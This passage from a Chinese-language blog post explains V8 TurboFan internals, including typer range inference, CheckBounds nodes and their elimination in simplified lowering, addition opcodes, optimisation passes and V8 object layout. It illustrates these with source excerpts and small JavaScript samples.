&amp;&amp; formal_count &gt; arity) &#123;</span><br><span class="line">      node-&gt;RemoveInput(n.FeedbackVectorIndex());</span><br><span class="line">      <span class="comment">// Underapplication. Massage the arguments to match the expected number of</span></span><br><span class="line">      <span class="comment">// arguments.</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = arity; i &lt; formal_count; i++) &#123;</span><br><span class="line">        node-&gt;InsertInput(graph()-&gt;zone(), arity + <span class="number">2</span>,</span><br><span class="line">                          jsgraph()-&gt;UndefinedConstant());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Patch &#123;node&#125; to a direct call.</span></span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), formal_count + <span class="number">2</span>, new_target);</span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), formal_count + <span class="number">3</span>,</span><br><span class="line">                        jsgraph()-&gt;Constant(arity));</span><br><span class="line">      NodeProperties::ChangeOp(node,</span><br><span class="line">                               common()-&gt;Call(Linkage::GetJSCallDescriptor(</span><br><span class="line">                                   graph()-&gt;zone(), <span class="literal">false</span>, <span class="number">1</span> + formal_count,</span><br><span class="line">                                   flags | CallDescriptor::kCanUseRoots)));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shared-&gt;HasBuiltinId() &amp;&amp;</span><br><span class="line">               Builtins::IsCpp(shared-&gt;builtin_id())) &#123;</span><br><span class="line">      <span class="comment">// Patch &#123;node&#125; to a direct CEntry call.</span></span><br><span class="line">      ReduceBuiltin(jsgraph(), node, shared-&gt;builtin_id(), arity, flags);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shared-&gt;HasBuiltinId()) &#123;</span><br><span class="line">      DCHECK(Builtins::HasJSLinkage(shared-&gt;builtin_id()));</span><br><span class="line">      <span class="comment">// Patch &#123;node&#125; to a direct code object call.</span></span><br><span class="line">      Callable callable = Builtins::CallableFor(</span><br><span class="line">          isolate(), <span class="keyword">static_cast</span>&lt;Builtins::Name&gt;(shared-&gt;builtin_id()));</span><br><span class="line">      CallDescriptor::Flags flags = CallDescriptor::kNeedsFrameState;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> CallInterfaceDescriptor&amp; descriptor = callable.descriptor();</span><br><span class="line">      <span class="keyword">auto</span> call_descriptor = Linkage::GetStubCallDescriptor(</span><br><span class="line">          graph()-&gt;zone(), descriptor, <span class="number">1</span> + arity, flags);</span><br><span class="line">      Node* stub_code = jsgraph()-&gt;HeapConstant(callable.code());</span><br><span class="line">      node-&gt;RemoveInput(n.FeedbackVectorIndex());</span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), <span class="number">0</span>, stub_code);  <span class="comment">// Code object.</span></span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), <span class="number">2</span>, new_target);</span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), <span class="number">3</span>, jsgraph()-&gt;Constant(arity));</span><br><span class="line">      NodeProperties::ChangeOp(node, common()-&gt;Call(call_descriptor));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Patch &#123;node&#125; to a direct call.</span></span><br><span class="line">      node-&gt;RemoveInput(n.FeedbackVectorIndex());</span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), arity + <span class="number">2</span>, new_target);</span><br><span class="line">      node-&gt;InsertInput(graph()-&gt;zone(), arity + <span class="number">3</span>, jsgraph()-&gt;Constant(arity));</span><br><span class="line">      NodeProperties::ChangeOp(node,</span><br><span class="line">                               common()-&gt;Call(Linkage::GetJSCallDescriptor(</span><br><span class="line">                                   graph()-&gt;zone(), <span class="literal">false</span>, <span class="number">1</span> + arity,</span><br><span class="line">                                   flags | CallDescriptor::kCanUseRoots)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Changed(node);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Range-types"><a href="#Range-types" class="headerlink" title="Range types"></a>Range types</h4><p>考虑下面的例子,根据<code>SSA</code>(IR的一种规范，可以参考<a href="https://blog.csdn.net/qq_29674357/article/details/78731713" target="_blank" rel="noopener">LLVM SSA 介绍</a>)。当<code>b==&quot;foo&quot;</code>时，x=5，否则x=10，因为在SSA里只能单变量赋值，因此这里我们引入了x0和x1，并使用<code>Phi</code>函数进行取值。</p>
<p>当对phi的返回值进行类型推断时，我们可以看到x2要么为5要么为10，那么x2很明显是一个<code>(5,10)</code>的<code>union</code>。我们做个符合SSA形式的流程图。看下v8里对这个节点进行推断的代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">10</span>; <span class="comment">// [1] x0 = 10</span></span><br><span class="line">  <span class="keyword">if</span> (b == <span class="string">"foo"</span>)</span><br><span class="line">    x = <span class="number">5</span>; <span class="comment">// [2] x1 = 5</span></span><br><span class="line">  <span class="comment">// [3] x2 = phi(x0, x1)</span></span><br><span class="line">  <span class="keyword">let</span> y = x + <span class="number">2</span>;</span><br><span class="line">  y = y + <span class="number">1000</span>; </span><br><span class="line">  y = y * <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的代码和我们想法相同，对可能的取值取union。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::TypePhi(Node* node) &#123;</span><br><span class="line">  <span class="keyword">int</span> arity = node-&gt;op()-&gt;ValueInputCount();</span><br><span class="line">  Type type = Operand(node, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arity; ++i) &#123;</span><br><span class="line">    type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2021/05/13/v8-basic/34.png" alt></p>
<p><del>后面我本地的图生成的和博客不同，因此以博客的为准</del>，我又知道为什么不一样了，我们需要点下<code>toggle types</code>这个Button，才能在Node里显示出判断的range范围，这里以我之后的例子做个图，下下图为博客里的图。</p>
<p><img src="/2021/05/13/v8-basic/37.png" alt></p>
<p><img src="/2021/05/13/v8-basic/35.png" alt></p>
<p>在源码中没有找到<code>SpeculativeNumberAdd</code>函数，目测是个<code>opcde</code>，在<code>SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST</code>表中已经定义好了函数地址，通过<code>table[idx]</code>的方式直接调用。而根据作者的说法，最终会调用到<code>NumberAdd</code>,或许<code>Speculativexxyyzz</code>就会调用<code>xxyyzz</code>?这里不太明白Mark一下.<code>AddRanger</code>函数为<code>Range</code>标明了范围。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::SpeculativeSafeIntegerAdd</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  Type result = SpeculativeNumberAdd(lhs, rhs);</span><br><span class="line">  <span class="comment">// If we have a Smi or Int32 feedback, the representation selection will</span></span><br><span class="line">  <span class="comment">// either truncate or it will check the inputs (i.e., deopt if not int32).</span></span><br><span class="line">  <span class="comment">// In either case the result will be in the safe integer range, so we</span></span><br><span class="line">  <span class="comment">// can bake in the type here. This needs to be in sync with</span></span><br><span class="line">  <span class="comment">// SimplifiedLowering::VisitSpeculativeAdditiveOp.</span></span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(result, cache_-&gt;kSafeIntegerOrMinusZero, zone());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberAdd</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// We can give more precise types for integers.</span></span><br><span class="line">  Type type = Type::None();</span><br><span class="line">  lhs = Type::Intersect(lhs, Type::PlainNumber(), zone());</span><br><span class="line">  rhs = Type::Intersect(rhs, Type::PlainNumber(), zone());</span><br><span class="line">  <span class="keyword">if</span> (!lhs.IsNone() &amp;&amp; !rhs.IsNone()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.Is(cache_-&gt;kInteger) &amp;&amp; rhs.Is(cache_-&gt;kInteger)) &#123;</span><br><span class="line">      type = AddRanger(lhs.Min(), lhs.Max(), rhs.Min(), rhs.Max());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ((lhs.Maybe(minus_infinity_) &amp;&amp; rhs.Maybe(infinity_)) ||</span><br><span class="line">          (rhs.Maybe(minus_infinity_) &amp;&amp; lhs.Maybe(infinity_))) &#123;</span><br><span class="line">        maybe_nan = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      type = Type::PlainNumber();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Take into account the -0 and NaN information computed earlier.</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::AddRanger</span><span class="params">(<span class="keyword">double</span> lhs_min, <span class="keyword">double</span> lhs_max, <span class="keyword">double</span> rhs_min,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">double</span> rhs_max)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">double</span> results[<span class="number">4</span>];</span><br><span class="line">  results[<span class="number">0</span>] = lhs_min + rhs_min;</span><br><span class="line">  results[<span class="number">1</span>] = lhs_min + rhs_max;</span><br><span class="line">  results[<span class="number">2</span>] = lhs_max + rhs_min;</span><br><span class="line">  results[<span class="number">3</span>] = lhs_max + rhs_max;</span><br><span class="line">  <span class="comment">// Since none of the inputs can be -0, the result cannot be -0 either.</span></span><br><span class="line">  <span class="comment">// However, it can be nan (the sum of two infinities of opposite sign).</span></span><br><span class="line">  <span class="comment">// On the other hand, if none of the "results" above is nan, then the</span></span><br><span class="line">  <span class="comment">// actual result cannot be nan either.</span></span><br><span class="line">  <span class="keyword">int</span> nans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::isnan(results[i])) ++nans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (nans == <span class="number">4</span>) <span class="keyword">return</span> Type::NaN();</span><br><span class="line">  Type type = Type::Range(array_min(results, <span class="number">4</span>), array_max(results, <span class="number">4</span>), zone());</span><br><span class="line">  <span class="keyword">if</span> (nans &gt; <span class="number">0</span>) type = Type::Union(type, Type::NaN(), zone());</span><br><span class="line">  <span class="comment">// Examples:</span></span><br><span class="line">  <span class="comment">//   [-inf, -inf] + [+inf, +inf] = NaN</span></span><br><span class="line">  <span class="comment">//   [-inf, -inf] + [n, +inf] = [-inf, -inf] \/ NaN</span></span><br><span class="line">  <span class="comment">//   [-inf, +inf] + [n, +inf] = [-inf, +inf] \/ NaN</span></span><br><span class="line">  <span class="comment">//   [-inf, m] + [n, +inf] = [-inf, +inf] \/ NaN</span></span><br><span class="line">  <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="CheckBounds-nodes"><a href="#CheckBounds-nodes" class="headerlink" title="CheckBounds nodes"></a>CheckBounds nodes</h4><p>考虑如下的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> values = [<span class="number">42</span>,<span class="number">1337</span>];       <span class="comment">// HeapConstant &lt;FixedArray[2]&gt;</span></span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">10</span>;                   <span class="comment">// NumberConstant[10]          | Range(10,10)</span></span><br><span class="line">  <span class="keyword">if</span> (b == <span class="string">"foo"</span>)</span><br><span class="line">    x = <span class="number">5</span>;                      <span class="comment">// NumberConstant[5]           | Range(5,5)</span></span><br><span class="line">                                <span class="comment">// Phi                         | Range(5,10)</span></span><br><span class="line">  <span class="keyword">let</span> y = x + <span class="number">2</span>;                <span class="comment">// SpeculativeSafeIntegerAdd   | Range(7,12)</span></span><br><span class="line">  y = y + <span class="number">1000</span>;                 <span class="comment">// SpeculativeSafeIntegerAdd   | Range(1007,1012)</span></span><br><span class="line">  y = y * <span class="number">2</span>;                    <span class="comment">// SpeculativeNumberMultiply   | Range(2014,2024)</span></span><br><span class="line">  y = y &amp; <span class="number">10</span>;                   <span class="comment">// SpeculativeNumberBitwiseAnd | Range(0,10)</span></span><br><span class="line">  y = y / <span class="number">3</span>;                    <span class="comment">// SpeculativeNumberDivide     | PlainNumber[r][s][t]</span></span><br><span class="line">  y = y &amp; <span class="number">1</span>;                    <span class="comment">// SpeculativeNumberBitwiseAnd | Range(0,1)</span></span><br><span class="line">  <span class="keyword">return</span> values[y];             <span class="comment">// CheckBounds                 | Range(0,1)</span></span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(opt_me);</span><br><span class="line">opt_me();</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me();</span><br><span class="line">opt_me();</span><br></pre></td></tr></table></figure>
<p>最后我们对<code>values[y]</code>取值时需要检查y的范围以保证不会越界读写，因此在IR图中增加了一个<code>CheckBounds</code>节点.仔细观察的话可以发现其取值为<code>(0,1)</code>。<code>LoadElement</code>的一个输入是类型为<code>FixedArray[2]</code>的<code>HeapConstant</code>，这就引出了我们的最后一部分<code>Simplified lowering</code></p>
<p><img src="/2021/05/13/v8-basic/38.png" alt></p>
<h4 id="Simplified-lowering"><a href="#Simplified-lowering" class="headerlink" title="Simplified lowering"></a>Simplified lowering</h4><p>这部分博客和本地的代码无法对应，因为最新的v8去掉了<code>CheckBounds elimination</code>，后面会分析一些与之相关经典的漏洞介绍为什么这个机制这么容易被利用。这里我们学习一下之前版本这里的设计。当我们发现index范围满足<code>[0,index_max] &amp;&amp; index_max &lt; length_min</code>时，我们可以对这个节点进行消除。之前设置的参数<code>v8_untrusted_code_mitigations</code>主要用于<code>lowering-&gt;poisoning_level_ == PoisoningMitigationLevel::kDontPoiso</code>条件的判定，具体原因可以参看<a href="https://www.anquanke.com/post/id/229482#h3-8" target="_blank" rel="noopener">浅析 V8-turboFan（上）</a>，主要代码是下面FLAG的赋值。默认配置导致我们无法得到正确的<code>load_poisoning</code>，从而无法启动<code>checkBounds</code>的优化。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            NodeProperties::ChangeOp(</span><br><span class="line">                node, simplified()-&gt;CheckedUint32Bounds(p.feedback()));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PipelineCompilationJob::Status <span class="title">PipelineCompilationJob::PrepareJobImpl</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Isolate* isolate)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;  <span class="comment">//set flags we want</span></span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123; <span class="comment">//true default</span></span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="addition-opcodes"><a href="#addition-opcodes" class="headerlink" title="addition opcodes"></a>addition opcodes</h4><p>我们根据几个例子来看不同情况下底层使用的opcode。</p>
<p>补一下js的基础知识<code>箭头函数</code>。</p>
<ul>
<li>箭头函数表达式的语法比函数表达式更简洁，并且没有自己的this，arguments，super或new.target。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数</li>
</ul>
<p>下面的函数在经过多次调用后推断i为一个<code>小整数</code>，因此使用<code>AddSmi</code>这个ignition opcode(前面我们提到ignition解释器产生字节码)。IR图里的加使用<code>SpeculativeSafeIntegerAdd</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> opt_me = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i)</span><br><span class="line">  opt_me(i);</span><br><span class="line">%DebugPrint(opt_me);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bytecode Age: 0                                                   </span><br><span class="line">         0x27f3082d2c52 @    0 : 25 03             Ldar a0        </span><br><span class="line">         0x27f3082d2c54 @    2 : 41 01 00          AddSmi [1], [0]</span><br><span class="line">         0x27f3082d2c57 @    5 : ab                Return</span><br></pre></td></tr></table></figure>
<p>在这个例子中x加和的对象为固定值<code>1000000000000</code>，它不能被小整数所表示，因此IR图为<code>SpeculativeNumberAdd</code>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> opt_me = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">opt_me(<span class="number">42</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="number">4242</span>)</span><br></pre></td></tr></table></figure>
<p>在这个例子中<code>y+100</code>的值需要进行推断，这里使用<code>SpeculativeSafeIntegerAdd</code>，在<code>simplified lowering</code>阶段，TurboFan确定y+100是两个整数的和，因此底层的node为<code>Int32Add</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> opt_me= <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> y = x ? <span class="number">10</span> : <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">return</span> y + <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">opt_me(<span class="literal">true</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></p>
<p>下面的例子中y是一个复杂的对象，这里只能使用性能较差的jsAdd。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> opt_me = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> y = x ? </span><br><span class="line">    (&#123;valueOf() &#123; <span class="keyword">return</span> <span class="number">10</span>; &#125;&#125;)</span><br><span class="line">    :</span><br><span class="line">    (&#123;[<span class="built_in">Symbol</span>.toPrimitive]() &#123; <span class="keyword">return</span> <span class="number">20</span>; &#125;&#125;);</span><br><span class="line">  <span class="keyword">return</span> y + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt_me(<span class="literal">true</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>在这个例子中<code>y+1000000000000</code>不能被Int表示出来，并且由于我们可以确定y是整数，在IR图中使用<code>NumberAdd</code>节点进行计算</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> opt_me = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> y = x ? <span class="number">10</span> : <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">return</span> y + <span class="number">1000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt_me(<span class="literal">true</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(opt_me);</span><br><span class="line">opt_me(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h4 id="TurboFan优化总结"><a href="#TurboFan优化总结" class="headerlink" title="TurboFan优化总结"></a>TurboFan优化总结</h4><p>优化的手段有：</p>
<ul>
<li>Inline 内联函数调用</li>
<li>trimming 删除未到达的节点</li>
<li>type 类型推断</li>
<li>typed-lowering 根据类型将表达式和指令替换为更简单的处理</li>
<li>loop-peeling 取出循环内的处理</li>
<li>loop-exit-elimination 删除loop-exit</li>
<li>load-elimination 删除不必要的读取和检查</li>
<li>simplified-lowering 使用具体的值来简化指令</li>
<li>generic-lowering 将JS前缀指令转换为更简单的调用和stub调用</li>
<li>dead-code-emilination 删除不可达的代码</li>
</ul>
<h3 id="v8对象"><a href="#v8对象" class="headerlink" title="v8对象"></a>v8对象</h3><p>参考<a href="https://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation" target="_blank" rel="noopener">a-tour-of-v8-object-representation</a>，v8中一个典型的对象布局如下。</p>
<p>大多数的对象将他们的属性放到一块区域中，如这里的<code>a和b</code>。所有的block都有一个指向map的指针，这个map代表了对象的结构。非对象内部的其他属性通常存放在一个<code>overflow array</code>中，如这里的<code>c和d</code>。数字式的属性通常存放在其他的连续内存的数组中。</p>
<p><img src="/2021/05/13/v8-basic/39.png" alt></p>
<p>v8对象的定义非常灵活，一个对象基本上就是属性的集合，基本上是<code>key-value</code>的字典对，可以通过一下两种方式访问</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.prop</span><br><span class="line">obj[<span class="string">"prop"</span>]</span><br></pre></td></tr></table></figure>
<p>根据标准，属性总是以字符串形式存在，因此如果使用一个不是string类型的属性，他会隐式地转换为字符串类型，正因为此，可以使用负数和小数对数组进行访问。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj[<span class="number">1</span>];</span><br><span class="line">obj[<span class="string">"1"</span>]; <span class="comment">//name for the same property</span></span><br><span class="line">obj[<span class="number">1.0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">toString</span>:funtion() &#123;<span class="keyword">return</span> <span class="number">-1.5</span>;&#125; &#125;;</span><br><span class="line">obj[<span class="number">-1.5</span>];</span><br><span class="line">obj[o];</span><br></pre></td></tr></table></figure>
<p>js中的<code>Arrays</code>又多了一项特殊的属性<code>length</code>.数组中大多数属性都是以非负整数命名。<code>length</code>返回数组中可以访问的最大索引+1，如：</p>
